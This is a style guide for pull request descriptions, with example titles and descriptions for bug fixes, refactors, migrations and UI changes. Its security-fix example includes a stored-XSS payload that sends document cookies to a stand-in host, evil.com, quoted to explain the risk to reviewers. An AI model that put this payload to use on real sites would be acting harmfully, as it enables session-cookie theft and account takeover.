# PR Description Guide

This guide helps you write effective PR descriptions with a casual but experienced engineer tone, explaining WHY not WHAT, avoiding robot speak.

## Table of Contents

1. [Core Principles](#core-principles)
2. [Structure](#structure)
3. [Title Guidelines](#title-guidelines)
4. [Description Guidelines](#description-guidelines)
5. [Analyzing Commits for Content](#analyzing-commits-for-content)
6. [Examples](#examples)
7. [Security Fixes](#security-fixes)
8. [What to Include](#what-to-include)
9. [Length Guidelines](#length-guidelines)
10. [Platform-Specific Notes](#platform-specific-notes)
11. [Quick Reference](#quick-reference)

---

## Core Principles

1. **Write like a human, avoid AI patterns** - No em dashes, use commas, hyphens, or just split the sentence
2. **Casual and conversational** - Like talking over coffee, not writing a report
3. **Explain WHY, not WHAT** - The diff shows what changed, explain why you made those choices
4. **Assume the reader can code** - Don't explain obvious things, focus on decisions and trade-offs

## Structure

```markdown
[Title - under 70 characters]

[1-2 sentence intro: what changed and why]

[Optional: More context - decisions, trade-offs, constraints that aren't obvious]

## Changes (for larger PRs)
- Key change 1 (focus on why, not what)
- Key change 2
- Key change 3

[Optional: call out risk level and what you tested if it's worth mentioning]
```

## Title Guidelines

### Under 70 characters
Titles get truncated in many views. Keep them scannable.

### Single commit
Use the commit subject line:
```
Fix OAuth redirect loop in Safari
```

### Multiple commits with Conventional Commits
Use the most significant change:
```
feat(auth): Add SSO support with Azure AD
```

### Multiple related commits
Find the theme:
```
Refactor payment flow for better error handling
Add caching layer for user permissions
Update checkout UI for mobile
```

### Fallback
If unclear, describe the main area:
```
Update authentication system
```

## Description Guidelines

### Intro (1-2 sentences)

Start with what changed and why it matters:

✅ **Good:**
> Split the auth service into separate concerns because the single file was getting unwieldy. Also moved session logic out since we'll need it for the API refactor next sprint.

❌ **Bad:**
> This PR implements a comprehensive refactoring of the authentication service to enhance modularity and maintainability.

✅ **Good:**
> Switched from polling to SSE for notifications. Polling was hammering the DB during peak hours.

❌ **Bad:**
> This PR updates the notification system to leverage Server-Sent Events technology for real-time updates.

### Context (optional paragraph)

Explain non-obvious decisions, trade-offs, or constraints:

✅ **Good:**
> Went with Redis instead of in-memory cache because we'll need this across multiple instances when we scale horizontally next month. The latency increase is negligible (~2ms) and worth the flexibility.

✅ **Good:**
> Kept the old endpoint around with a deprecation warning rather than removing it outright. Marketing still has some email campaigns hitting it that won't expire until next week.

❌ **Bad:**
> The implementation follows industry best practices and ensures optimal performance.

### Changes section

List 3-5 key changes. Focus on WHY, not WHAT:

✅ **Good:**
```markdown
## Changes
- Split UserService into AuthService and ProfileService since auth was getting complicated with SSO
- Added Redis caching for permissions (was hitting DB on every request)
- Moved session logic to separate module for the upcoming API work
```

❌ **Bad:**
```markdown
## Changes
- Created new AuthService class
- Implemented Redis caching functionality
- Refactored session management module
- Updated unit tests
- Added documentation
```

## Analyzing Commits for Content

### Single commit
Use the commit message directly. If the body has context, include it.

### Multiple related commits
1. Find the common theme (auth, payment, UI, testing, etc.)
2. Extract "why" context from commit bodies
3. Note trade-offs or constraints mentioned
4. Summarize the overall goal

### Multiple unrelated commits
Group by topic:
```markdown
Fixed a few unrelated issues:
- Auth redirect was broken in Safari (cookie SameSite issue)
- Checkout button styling was off on mobile
- Added missing index on orders table (queries were slow)
```

## Examples

### Small: one-liner bug fix

```markdown
fix(mobile): logout button z-index

Was hidden behind the nav on small viewports. Bumped z-index and added a test.
```

### Small: config change

```markdown
Bump Node to 20 LTS

18 goes EOL next month, and we need the built-in fetch for the webhook rewrite.
```

### Medium: feature

```markdown
Add email verification for new signups

We were getting a lot of fake accounts, so now new users need to verify their email before they can post. Went with a simple token-in-URL approach rather than magic links since we don't have email rendering set up yet.

- Verification flow runs after signup, before user can access dashboard
- Tokens expire after 24 hours to keep the table clean
- Existing users are grandfathered in as verified
```

### Medium: bug fix

```markdown
Fix double-charge on rapid checkout clicks

Orders were sometimes charging twice when users double-clicked the button. Added a processing state to disable the button, plus idempotency keys on the Stripe side just to be safe.

Tested with rapid clicks and flaky network. Stripe dashboard confirms single charge.
```

### Large: refactor

```markdown
Break up OrderService

OrderService was doing too much (validation, pricing, inventory, shipping). Split it into focused services. Left the old class as a facade for now since there are a lot of call sites to update.

## Changes
- Pulled pricing logic into PricingService (needed this for the quote feature anyway)
- Moved inventory checks to InventoryService (shared with warehouse dashboard)
- Created ShippingService for carrier logic
- OrderService now just orchestrates the others

Low risk since everything still goes through the facade. Existing tests pass without changes.
```

### Large: migration

```markdown
Migrate auth from sessions to JWT

We need to support mobile apps, and they don't handle cookies well. Switched to JWT with refresh tokens. Kept session support behind a feature flag since we can't migrate all web users at once.

Refresh token rotation is a bit involved - each use generates a new token and kills the old one. Limits the window if a token gets stolen. Tokens live in Redis with a 7-day TTL, purged on logout.

Went with localStorage for web and secure storage for mobile. Yeah, XSS is a risk, but we have CSP and this unblocks the mobile launch.

## Changes
- JWT auth with RS256 (public/private key pair)
- Refresh token rotation to prevent reuse
- Feature flag to switch between session and JWT
- Migration script to generate tokens for active sessions

Touches the entire auth path, so worth a careful look. Tested on both web and mobile (iOS + Android). Flag defaults to off so existing sessions keep working.
```

### Security fix

```markdown
Fix stored XSS in profile bio

The bio field accepted raw HTML and rendered it unescaped. An attacker could put a script tag in their bio that runs for anyone viewing their profile, stealing session cookies and leading to account takeover.

Switched to DOMPurify for sanitization. Also added CSP headers as defense in depth.

## Exploit chain
1. Attacker sets bio to `<script>fetch('https://evil.com?c='+document.cookie)</script>`
2. Victim views the profile
3. Script exfiltrates session cookies
4. Attacker replays the cookie

MITRE ATT&CK: T1189 (Drive-by Compromise), T1539 (Steal Web Session Cookie)
```

### UI change

```markdown
Redesign checkout flow for mobile

The old checkout was a single long form that was painful on phones. Split it into 3 steps with a progress indicator. Conversion numbers on mobile have been bad and this was the main complaint in user feedback.

Screenshots in the PR comments.

## Changes
- 3-step wizard: shipping, payment, review
- Progress bar at the top
- Form state persists between steps (no data loss on back)
- Same single-page flow on desktop, only splits on viewports under 768px
```

## Security Fixes

For security PRs, explain the exploit chain so reviewers understand the actual risk. Reference MITRE ATT&CK techniques where applicable (e.g. T1539 - Steal Web Session Cookie). If people don't understand how serious it is, security PRs get deprioritized.

## What to Include

### ✅ Include

- **Non-obvious decisions:** Why you chose approach A over B
- **Trade-offs:** What you gained and what you gave up
- **Constraints:** Time, compatibility, dependencies
- **Future considerations:** "We'll need this when..." or "Left old code because..."
- **Context for reviewers:** Things that might be surprising or need explanation
- **Security fixes:** Explain the exploit chain and reference MITRE ATT&CK techniques

### ❌ Skip

- **What the code does:** Visible in the diff
- **Implementation details:** Unless they're surprising or clever
- **History/conversation:** "We discussed this", "As mentioned before"
- **Obvious observations:** "Added tests", "Fixed bug"
- **Platitudes:** "Improves maintainability", "Follows best practices"

## Length Guidelines

Scale to match the PR. See the [Examples](#examples) section for what each size looks like.

- **Small** (1-2 commits, <50 lines): a sentence or two, no sections
- **Medium** (3-5 commits, 50-300 lines): short intro + bullets if needed
- **Large** (5+ commits, 300+ lines): full context, changes section, risk callout

If you need more than 3-4 paragraphs, the PR should probably be split.

## Platform-Specific Notes

### GitHub
- Supports full Markdown, including task lists, tables, code blocks
- Reference issues with `#123` or `owner/repo#123`
- Mention users with `@username` or teams with `@org/team`
- Link commits with full SHA
- Use `Fixes #123` or `Closes #123` to auto-close issues on merge

### Azure DevOps
- Supports Markdown
- Link work items with `#123` or use `--work-items` flag
- Reference commits with full SHA or Azure DevOps work item syntax
- Use multiple `--description` flags for multi-line descriptions in CLI
- Each `--description` becomes a new line

## Quick Reference

| Principle | Good | Bad |
|-----------|------|-----|
| Tone | "Split the service because it was getting messy" | "Refactored service to enhance modularity" |
| Focus | "Chose Redis over in-memory to support horizontal scaling" | "Implemented Redis caching solution" |
| Details | "Left old endpoint for marketing emails expiring next week" | "Maintained backward compatibility" |
| Testing | "Verified rapid clicks don't cause double charge" | "Tested extensively" |
| Length | 2-4 paragraphs | 8 paragraphs or 1 sentence |

Remember: You're explaining your work to another engineer. Be clear, be humble, explain your reasoning. Skip the fluff.
